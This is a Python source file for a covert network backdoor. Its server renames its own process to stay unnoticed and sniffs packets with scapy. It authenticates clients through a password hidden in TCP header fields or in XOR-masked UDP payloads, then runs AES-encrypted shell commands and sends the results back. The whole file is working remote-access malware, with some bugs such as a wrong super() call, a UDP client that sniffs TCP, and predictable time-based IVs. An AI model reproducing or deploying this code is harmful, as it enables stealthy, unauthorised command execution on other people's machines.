from __future__ import print_function
from scapy.all import *
from setproctitle import setproctitle, getproctitle

import command
import Crypto.Cipher
import struct
import sys
import time
import traceback

PASSWORD_LEN=8

FIN = 0x01
SYN = 0x02
RST = 0x04
PSH = 0x08
ACK = 0x10
URG = 0x20
ECE = 0x40
CWR = 0x80

def make_iv():
    """Creates a 16-byte initialisation vector for AES encryption using the current time."""

    timestamp = time.time()

    # for the forseeable future, timestamp is representable in 4 bytes
    iv = struct.pack("<IIII", timestamp, timestamp, timestamp, timestamp)
    return iv

class BackdoorServer(object):

    def __init__(self, procname, aeskey, password):
        """Initialises a backdoor server with the given settings.
        
        Positional arguments:
        procname - the name with which to replace the current process's name. cannot contain spaces.
        aeskey   - a "secret" pre-shared key to use for AES encryption. the client and server will already know this key.
        password - a password to authenticate clients and ensure that decryption succeeded.
        """
        self.procname = procname
        self.aeskey = aeskey
        self.password = password
        self.client = None

    def mask_process(self):
        """Changes the process's name to self.procname to make it less conspicuous to people examining the process table."""
        setproctitle(self.procname)

    def recv(self):
        """Receives and returns bytes from the next packet sent from a connected client.
        
        Returns a bytes object containing the packet's payload.
        """
        raise NotImplementedError

    def send(self, buf):
        """Sends the contents of buf to the remote connected client.
        
        Poaitional arguments:
        buf - a bytes object to send to the client.
        """
        # TODO: Remove this and move result sending logic completely to send_result
        raise NotImplementedError

    def listen(self):
        """Listens for a client and stores its IP address (as a string) in self.client on receiving a connection."""
        raise NotImplementedError

    def recv_command(self):
        """Receives and deserialises the next command from the connected client.
        
        Returns the received command as a Command object.
        """
        # Continue looping until we get a command
        # Ignore any packets that can't be decrypted or don't have the password in them
        while True:
            buf = self.recv()
            if len(buf) < 16:
                continue

            iv = buf[0:16]
            decryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)
            decrypted = decryptor.decrypt(buf[16:])

            if len(decrypted) < PASSWORD_LEN + 1: # password length + command byte
                continue

            # We may have had to pad the payload for encryption; the size of the payload without
            # padding is stored in the first 4 bytes
            nopaddinglen = struct.unpack("<I", decrypted[0:4])[0]
            start = 4
            if decrypted[start:start+PASSWORD_LEN] == self.password:
                start += PASSWORD_LEN
                cmdbytes = decrypted[start:start+nopaddinglen]
                cmdtype = cmdbytes[0] if isinstance(cmdbytes[0], int) else ord(cmdbytes[0])

                if cmdtype == command.Command.SHELL:
                    cmd = command.ShellCommand.from_bytes(cmdbytes)
                elif cmdtype == command.Command.WATCH:
                    cmd = command.WatchCommand.from_bytes(cmdbytes)
                elif cmdtype == command.Command.END:
                    cmd = None
                else:
                    raise ValueError("Unknown command type {}".format(cmdtype))

                return cmd


    def send_result(self, result):
        """Sends the results of a command execution to the client.
        
        Positional arguments:
        result - A Result object containing the command's result.
        """
        # TODO: Change packet structure to handle splitting result into multiple packets (1KiB each)
        # First packet structure:
        # - 16 bytes: initialisation vector
        # - 4 bytes: length of entire result (i.e. len(result.to_bytes()))
        # - 8 bytes: password
        # - remaining bytes: result bytes; if length of result is < 996, extra space is filled with random bytes
        # 
        # Subsequent packets (if the result didn't fit in the first one):
        # - 8 bytes: password
        # - remaining bytes: result bytes + random bytes if remaining result len is < 1016 bytes
        #
        # All subsequent packets will use the same IV as the first packet. The password is only included again
        # so that the client can verify that everything was decrypted successfully.
        #
        # Also TODO: Remove send() and do connection setup/teardown in here
        payload = self.password + result.to_bytes()
        payload = struct.pack("<I", len(payload)) + payload

        remainder = len(payload) % Crypto.Cipher.AES.block_size
        if remainder:
            payload += '\0' * (Crypto.Cipher.AES.block_size - remainder)

        iv = make_iv()        
        encryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)
        payload = encryptor.encrypt(payload)
        payload = iv + payload

        self.send(payload)

    def run(self):
        """Runs in a loop listening for clients and serving their requests."""
        self.mask_process()
        while True:
            print("Waiting for client...")
            
            # TODO: Why is this a loop?
            while not self.client:
                self.listen()

            print("Client connected: {}".format(self.client))
            while True:
                try:
                    cmd = self.recv_command()
                    if not cmd:
                        print("{} disconnected.".format(self.client))
                        self.client = None
                        break

                    result = cmd.run()

                    print("")
                    print(str(cmd))
                    print(str(result))
                    print("")

                    self.send_result(result)

                except KeyboardInterrupt:
                    print("see ya")
                    sys.exit(0)

                except Exception, err:
                    traceback.print_exc()
                    break

class TcpBackdoorServer(BackdoorServer):

    def __init__(self, procname, aeskey, password, listenport, clientport):
        """Creates a new TcpBackdoorServer with the specified settings.
        
        Positional arguments:
        listenport - The port on which the backdoor server will listen for clients.
        clientport - The port on which the server will connect back to clients to send command results.
        """
        super(TcpBackdoorServer, self).__init__(procname, aeskey, password)
        self.lport = listenport
        self.dport = clientport

    def listen(self):
        # Create a new random source port from which to send
        self.sport = RandShort()

        # If MSS option + window size + ISN == the password and the traffic is bound for the correct port, we probably have a client
        def is_auth(packet):
            if len(packet["TCP"].options) == 0:
                return False

            mss = next((v for i, v in enumerate(packet["TCP"].options) if v[0] == "MSS"), None)
            if not mss:
                return False

            mss = mss[1] # Get the actual MSS value from the tuple

            window = packet["TCP"].window
            isn = packet["TCP"].seq

            pw = struct.pack("<HHI", mss, window, isn)
            if pw == self.password:
                self.client = packet["IP"].src
                return True
            else:
                return False

        bpf_filter = "tcp dst port {}".format(self.lport)
        sniff(filter=bpf_filter, stop_filter=is_auth)

    def recv(self):
        bpf_filter = "src host {} and tcp dst port {}".format(self.client, self.lport)
        pkts = sniff(filter=bpf_filter, count=1)

        return bytes(pkts[0]["TCP"].payload)

    def send(self, payload):
        # TODO: Remove this
        try:
            packet = IP(dst=self.client)\
                     / TCP(dport=self.dport, sport=self.sport, window=32768, flags=PSH|ACK)\
                     / Raw(load=payload)
            send(packet)
        except Exception, err:
            traceback.print_exc()
            sys.exit(1)

class UdpBackdoorServer(BackdoorServer):
    def __init__(self, procname, aeskey, password, listenport, clientport):
        """Creates a new UdpBackdoorServer with the specified settings.
        
        Positional arguments:
        listenport - The port on which the backdoor server will listen for clients.
        clientport - The port on which the server will connect back to clients to send command results.
        """
        super(UdpBackdoorServer, self).__init__(procname, aeskey, password)
        self.lport = listenport
        self.dport = clientport

    def listen(self):
        # Create a new random source port from which to send
        self.sport = RandShort()

        # If payload xor ((packet["UDP"].sport << 48) + (packet["UDP"].sport << 32) + (packet["UDP"].sport << 16) + (packet["UDP"].sport)) == pw, we have a client
        def is_auth(packet):
            if len(packet["UDP"].payload) != 8:
                return False

            int_payload = struct.unpack("<Q", packet["UDP"].payload)[0]
            xor_mask = (packet["UDP"].sport << 48) + (packet["UDP"].sport << 32) + (packet["UDP"].sport << 16) + (packet["UDP"].sport)
            pw = struct.pack("<Q", int_payload ^ xor_mask)

            if pw == self.password:
                self.client = packet["IP"].src
                return True
            else:
                return False

        bpf_filter = "udp dst port {}".format(self.lport)
        sniff(filter=bpf_filter, stop_filter=is_auth)

    def recv(self):
        bpf_filter = "src host {} and udp dst port {}".format(self.client, self.lport)
        pkts = sniff(filter=bpf_filter, count=1)

        return bytes(pkts[0]["UDP"].payload)

    def send(self, payload):
        # TODO: Remove this
        pass

class BackdoorClient(object):

    def __init__(self, aeskey, password):
        """Creates a new backdoor client with the specified AES key and password.
        
        Positional arguments:
        aeskey   - a "secret" pre-shared key for AES encryption.
        password - a password to authenticate clients and ensure that decryption succeeded.
        """
        self.aeskey = aeskey
        self.password = password

    def connect(self):
        """Connects to the backdoor server.

        This may silently fail if the protocol doesn't implement acknowledgments on connect.
        """
        raise NotImplementedError

    def send(self, payload):
        """Sends the bytes in payload to the server.
        
        Positional arguments:
        payload - A bytes object to send to the server.
        """
        raise NotImplementedError

    def recv(self):
        """Receives a packet from the server.
        
        Returns a bytes object containing the packet's payload.
        """
        # TODO: 
        raise NotImplementedError

    def send_command(self, command):
        """Sends a command to the server for remote execution or to signal the end of the connection.
        
        Positional arguments:
        command - A Command object that will be serialised, encrypted, and sent to the server.
        """
        iv = make_iv()
        encryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)
        payload = self.password + command.to_bytes()
        payload = struct.pack("<I", len(payload)) + payload
        
        # blocks have to be padded to multiples of 16 bytes for AES
        remainder = len(payload) % Crypto.Cipher.AES.block_size
        if remainder:
            payload += '\0' * (Crypto.Cipher.AES.block_size - remainder)

        payload = encryptor.encrypt(payload)
        payload = iv + payload

        self.send(payload)

    def recv_result(self):
        """Receives the results of a command's execution from the server.
        
        Returns a Result object containing the command's result.
        """
        while True:
            # TODO: Change this to use new logic described in BackdoorSever.send_result
            raw = self.recv()
            if len(raw) < 16:
                continue

            iv = raw[0:16]
            decryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)           
            decrypted = decryptor.decrypt(raw[16:])
            
            if len(decrypted) < PASSWORD_LEN + 1: # password + command byte
                continue

            # We may have had to pad the payload for encryption; the size of the payload without
            # padding is stored in the first 4 bytes
            nopaddinglen = struct.unpack("<I", decrypted[0:4])[0]
            start = 4

            if decrypted[start:start+PASSWORD_LEN] == self.password:
                start += PASSWORD_LEN
                resultbytes = decrypted[start:start+nopaddinglen]
                resulttype = resultbytes[0] if isinstance(resultbytes[0], int) else ord(resultbytes[0])

                if resulttype == command.Command.SHELL:
                    return command.ShellCommand.Result.from_bytes(resultbytes)
                elif resulttype == command.Command.WATCH:
                    return command.WatchCommand.Result.from_bytes(resultbytes)
                else:
                    print("Unhandled result type {}".format(resulttype))
                    sys.exit(1)

class TcpBackdoorClient(BackdoorClient):
    def __init__(self, aeskey, password, listenport, serverport, server):
        super(TcpBackdoorClient, self).__init__(aeskey, password)
        self.server = server
        self.lport = listenport
        self.dport = serverport

    def connect(self):
        # Insert the password into the packet so that the server can authenticate us
        mss, windowsize, isn = struct.unpack("<HHI", self.password)

        self.sport = RandShort()
        self.seq = isn

        try:
            connpacket = IP(dst=self.server) / TCP(dport=self.dport, sport=self.sport, window=windowsize, seq=isn, flags=SYN, options=[("MSS", mss)])
            send(connpacket)
        except Exception, err:
            traceback.print_exc()
            sys.exit(1)

    def send(self, payload):
        try:
            packet = IP(dst=self.server)\
                     / TCP(dport=self.dport, sport=self.sport, window=32768, seq=self.seq, flags=PSH|ACK)\
                     / Raw(load=payload)

            self.seq += len(payload)
            send(packet)
        except Exception, err:
            traceback.print_exc()
            sys.exit(1)

    def recv(self):
        bpf_filter = "src host {} and tcp dst port {}".format(self.server, self.lport)
        pkts = sniff(filter=bpf_filter, count=1)

        return bytes(pkts[0]["TCP"].payload.load)

class UdpBackdoorClient(BackdoorClient):
    def __init__(self, aeskey, password, listenport, serverport, server):
        super(TcpBackdoorClient, self).__init__(aeskey, password)
        self.server = server
        self.lport = listenport
        self.dport = serverport

    def connect(self):
        # Insert the password into the packet so that the server can authenticate us
        self.sport = RandShort()
        xor_mask = self.sport << 48 + self.sport << 32 + self.sport << 16 + self.sport
        masked_pw = struct.pack("<Q", struct.unpack("<Q", self.password)[0] ^ xor_mask)

        try:
            connpacket = IP(dst=self.server) / UDP(dport=self.dport, sport=self.sport) / Raw(load=masked_pw)
            send(connpacket)
        except Exception, err:
            traceback.print_exc()
            sys.exit(1)

    def send(self, payload):
        try:
            packet = IP(dst=self.server)\
                     / UDP(dport=self.dport, sport=self.sport)\
                     / Raw(load=payload)

            send(packet)
        except Exception, err:
            traceback.print_exc()
            sys.exit(1)

    def recv(self):
        bpf_filter = "src host {} and tcp dst port {}".format(self.server, self.lport)
        pkts = sniff(filter=bpf_filter, count=1)

        return bytes(pkts[0]["TCP"].payload.load)
